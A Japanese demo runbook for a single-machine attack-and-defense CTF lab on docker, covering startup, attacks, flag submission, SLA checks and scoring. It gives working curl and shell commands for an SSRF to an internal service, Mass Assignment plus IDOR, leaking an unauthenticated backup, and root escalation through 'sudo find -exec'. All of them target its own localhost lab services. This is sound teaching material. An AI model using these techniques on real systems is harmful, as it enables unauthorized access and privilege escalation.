# A&D CTF 単一マシン — デモ実演手順書

計画書のシナリオ5件中 **4件が動く** 単一マシン Attack & Defense 環境を、
攻撃 → FLAG提出 → 加点 → SLA/防御ポイント まで一気通貫で見せるための手順。

- 所要時間の目安: 起動 3分 + 実演 10〜12分
- 使用マシン: 本 Mac 1台（docker）だけ
- 登場人物: **攻撃者**（＝実演者）と **競技サービス**（service-a/b/c）

---

## 0. 事前準備（デモ開始前に済ませておく）

### 起動モードは2つ（当日の状況で選ぶ）

- **モードA｜ローカル単一マシン（既定・フォールバック）**
  Wi-Fi不通など何かあってもこの1台で完結。
  ```bash
  cd ~/score-server && docker compose up -d
  ```
- **モードB｜実インフラ**
  score-server が別VMのFLAGローテータDB（192.168.10.4）を指す。CTFdは同じVMで起動する前提。
  ```bash
  cd ~/score-server && docker compose -f docker-compose.yml -f docker-compose.infra.yml up -d
  ```
  > モードB を使う前に確認: ①score-server VM から `192.168.10.4:3306` へ到達可（`nc -vz 192.168.10.4 3306`）、
  > ②`.4` のMySQLがremote接続許可（bind-address / `rotator'@'%'` grant / FW）、
  > ③CTFd を同じVMで起動済みか（`~/CTFd` を `docker compose up -d`。score-serverは `host.docker.internal:8000` で到達）。
  > うまく繋がらない場合は迷わず**モードAに切替**（`docker compose down` 後にモードAで起動し直し）。

```bash
# score-server（:8001 スコア計算）— 上のモードA/Bどちらかで起動
cd ~/score-server && docker compose up -d

# CTFd（:8000 スコアボード表示）
cd ~/CTFd && docker compose up -d

# 競技サービス3種 + SLAチェッカー
cd ~/ad-services && docker compose up -d --build
```

稼働確認（このまま画面に出しておくと「動いていること」の証跡になる）:

```bash
cd ~/ad-services && docker compose ps
```

> service-a / service-b / service-c / sla-checker が `Up` であることを確認。
> FLAG ローテーターが `./flags/*.txt` に現在ラウンドの FLAG を書いている前提。

---

## 1. デモの流れ（全体像を口頭で1分）

1. 4つの脆弱サービスに **攻撃** して FLAG を奪う（攻撃点）
2. 奪った FLAG を score-server に **提出** → 加点、二重提出は拒否
3. 裏で **SLAチェッカー** がサービスの死活を監視 → **防御ポイント**に反映

---

## 2. 攻撃①  SSRF（service-a / :8101）

外部に公開していない内部 Elasticsearch 相当（127.0.0.1:9200）へ、
サーバ経由で到達させて FLAG を抜く。

```bash
curl -s -X POST http://localhost:8101/api/v1/profile/image \
  -H 'Content-Type: application/json' \
  -d '{"image_url":"http://127.0.0.1:9200/system-logs/_search?q=FLAG"}'
```

**着目点**: 9200番は `docker-compose` で publish していない = 外からは叩けない。
サーバに URL を渡させる SSRF が無いと届かない、という設計。

---

## 3. 攻撃②  Mass Assignment → IDOR（service-b / :8102）

一般ユーザーが自分を管理者に「昇格」させ、他人（管理者）の秘密を読む2段攻撃。

```bash
# (1) 一般ユーザー ctf-user でログイン → トークン取得
#     ※ service-b(HTTP) のパスワードは "password"。SSH の ctf-pass とは別なので注意。
TOKEN=$(curl -s -X POST http://localhost:8102/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"ctf-user","password":"password"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# (2) Mass Assignment: 送ってはいけない is_admin を混ぜて昇格
curl -s -X PUT http://localhost:8102/api/v1/user/profile \
  -H "X-Session-Token: $TOKEN" -H 'Content-Type: application/json' \
  -d '{"display_name":"pwned","is_admin":true}'

# (3) IDOR: 他人(id=1 管理者)の情報を参照 → secret_note に FLAG
curl -s "http://localhost:8102/api/v1/user/info?id=1" \
  -H "X-Session-Token: $TOKEN"
```

**着目点**: (2) が `is_admin` を無検証で UPDATE している（Mass Assignment）。
(3) は所有者チェックが無い（IDOR）。単体では弱いが **連鎖**で管理者機密に届く。

### FLAG を提出して加点する（score-server）

奪った FLAG を score-server に提出する。提出先は `PUT /flags/`（:8001）。
ヘッダは `X-Team-Token`、ボディは **FLAG文字列のJSON配列**。

```bash
# (1) 自チーム(team1)のトークンを取得
TEAM_TOKEN=$(cd ~/score-server && docker compose exec -T db \
  psql -U score -d score -t -A -c "SELECT token FROM teams WHERE name='team1';")

# (2) 奪ったFLAGを提出（配列で渡す）
curl -s -X PUT http://localhost:8001/flags/ \
  -H "X-Team-Token: $TEAM_TOKEN" -H 'Content-Type: application/json' \
  -d '["FLAG{massassign_idor_r1_11e9f714c697}"]'
```

応答は `[{"flag":"...","msg":"[...] メッセージ"}]` のJSON配列。`msg` の中身で判定する:
`Flag accepted! Earned 10 flag points!`（成功） / `Invalid flag`（未知のFLAG） /
`This flag is your own`（自チームのFLAGは無得点） / `Flag already stolen`（二重提出は拒否）。
（トークン誤りは配列でなく `{"error":"Invalid team token."}` を返す）

⚠️ **単一マシンdemoの注意**: 現構成では脆弱サービス(ad-services)と score-server の
**FLAGソースが別**で、service-b が出す `FLAG{massassign_idor_...}` は score-server の
DBには入っていない。そのため上記をそのまま出すと `Invalid flag` になる。
加点まで実演したい場合は、score-server が実際に保持する **別チームのFLAG** を team1 の
トークンで提出する（自チームFLAGは `This flag is your own` で無得点になるため別チームを使う）:

```bash
FLAG=$(cd ~/score-server && docker compose exec -T db psql -U score -d score -t -A \
  -c "SELECT flag FROM flags WHERE team_id=2 ORDER BY round DESC LIMIT 1;")
curl -s -X PUT http://localhost:8001/flags/ -H "X-Team-Token: $TEAM_TOKEN" \
  -H 'Content-Type: application/json' -d "[\"$FLAG\"]"
```

本番ではローテーターが同じ FLAG をサービスと score-server の両方へ書き込むため、
この不一致は起きない（＝奪ったFLAGがそのまま加点対象になる）。

---

## 4. 攻撃③  バックアップ漏洩（service-b / :8102）

昇格済みトークンで管理バックアップを生成させ、無認可の公開パスから回収する。

```bash
# (1) 管理者機能でバックアップ生成（固定パスに出力されるのが脆弱点）
curl -s -X POST http://localhost:8102/api/v1/admin/backup \
  -H "X-Session-Token: $TOKEN"

# (2) 認可なしで誰でも DL できてしまう
curl -s -o /tmp/leak.tar.gz \
  http://localhost:8102/assets/backups/system_backup.tar.gz
tar -xzf /tmp/leak.tar.gz -C /tmp && \
  grep -i flag /tmp/db_dump.sql; cat /tmp/rotation_secret.txt
```

**着目点**: バックアップ名が固定・`/assets` が無認可配信。
FLAG に加えて **ローテーション秘密鍵** まで漏れる（横展開の踏み台）。

---

## 5. 攻撃④  sudo find 権限昇格（service-c / SSH :2222）

SSH ログイン後、設定ミス（`find` の NOPASSWD sudo）で root に昇格し、
root しか読めない FLAG を奪う。

```bash
# (1) 一般ユーザーで SSH ログイン（パスワード: ctf-pass）
ssh -p 2222 ctf-user@localhost

# --- ここから接続先で操作 ---
cat ~/.bash_history          # 過去に sudo find を使った痕跡（ヒント）
sudo -l                      # find が NOPASSWD であることを確認
cat /root/flag.txt           # → Permission denied（一般ユーザーでは読めない）

# (2) find の -exec で root 権限のままファイルを読ませる
sudo /usr/bin/find /etc/hostname -exec cat /root/flag.txt \; -quit
sudo /usr/bin/find /etc/hostname -exec id \; -quit    # uid=0(root) を確認
```

**着目点**: 脆弱性は OS ではなく **sudoers の設定ミス**。`find -exec` が任意コマンドを
root で実行できてしまう典型パターン。

---

## 6. FLAG 提出 → スコア加点（CTFdダッシュボードでスコア変動を見せる）

奪った FLAG を score-server に提出すると、ラウンド確定時に score-server が
自動で CTFd の AWD プラグイン（`/plugins/awd/api/update`）へ結果を push する。
**手動での反映操作は不要**（FLAGローテーターのラウンド進行に連動）。

### (1) 提出前にCTFdの画面を開いておく

```
http://localhost:8000/scoreboard      # 全チームのランキング表
http://localhost:8000/teams/1         # team1 個別ページ（スコア推移グラフ）
```

- `teams/1` ページにはチームごとの **スコア推移グラフ（折れ線）** が表示される
  （AWDプラグインの `score-graph`）。デモ開始時点ではまだ平らな状態を見せておく。

### (2) FLAG を提出

```bash
# 例: 同じ FLAG をもう一度出すと二重提出として拒否されることも見せる
# （提出 API / 画面は score-server の運用に合わせる）
```

- 同一 FLAG の再提出が **拒否**されることも実演すると「不正防止」が伝わる。

### (3) 次のラウンドを待って画面を更新 → 変動を見せる

- FLAGローテーターの次ラウンドが確定すると、score-server が自動で CTFd へ push する。
- `scoreboard` を再読み込み → team1 の**順位・得点が上がる**のを見せる。
- `teams/1` を再読み込み → **スコア推移グラフが階段状に上昇**するのを見せる
  （攻撃成功＝加点、SLA維持＝防御点、を同じグラフ上で確認できる）。
- 余裕があれば、わざと `docker compose stop service-b` してから次ラウンドを待ち、
  防御失敗（SLA DOWN）でグラフの伸びが鈍る／止まる様子も対比で見せると分かりやすい。

---

## 7. SLA 監視 → 防御ポイント

裏で回っている SLA チェッカーのログと、その結果が防御点に反映されることを見せる。

```bash
# HTTP×2（service-a/b）+ TCP+バナー×1（service-c=SSH）を1巡チェック
cd ~/sla-checker && python3 main.py --once
```

想定出力:

```
[✓] team1/service-a  UP   http://.../health
[✓] team1/service-b  UP   http://.../health
[✓] team1/service-c  UP   tcp://localhost:2222     ← SSH は TCP+バナーで死活判定
```

- score-server の `/scoreboard` に `sla_rate=1.0` / `defense_pts=5.0` が反映。
- ここで **わざと1サービスを止めて**（`docker compose stop service-b`）もう一度 `--once`
  を回すと DOWN 判定 → 防御ポイントが下がる、まで見せる。

---

## 8. まとめ（口頭）

| シナリオ | サービス | 状態 |
| --- | --- | --- |
| ① SSRF | service-a | ✅ |
| ② Mass Assignment + IDOR | service-b | ✅ |
| ③ バックアップ漏洩 | service-b | ✅ |
| ④ sudo find 権限昇格 | service-c(SSH) | ✅ |
| ⑤ vsftpd + Dirty Pipe | — | △ バックドアは可、Dirty Pipe は実VM必須 |

- **IaC（Packer/Ansible/Terraform + 校内ハイパーバイザ）→ docker-compose で代用**。
- 単独では ⑤ の Dirty Pipe（カーネル脆弱性）だけが忠実再現不可。

---

## デモ後の後片付け

```bash
cd ~/ad-services && docker compose down
# score-server / CTFd を止める場合はそれぞれの compose で down
```

### トラブル時のフォールバック

- **Docker Hub 不通で `sla-checker` を再ビルドできない**: ホスト側の venv で
  `cd ~/sla-checker && python3 main.py --once` を使う（動作確認はこの方法で実施済み）。
- **ポート競合（3306 等）**: 競合コンテナを停止してから起動する。


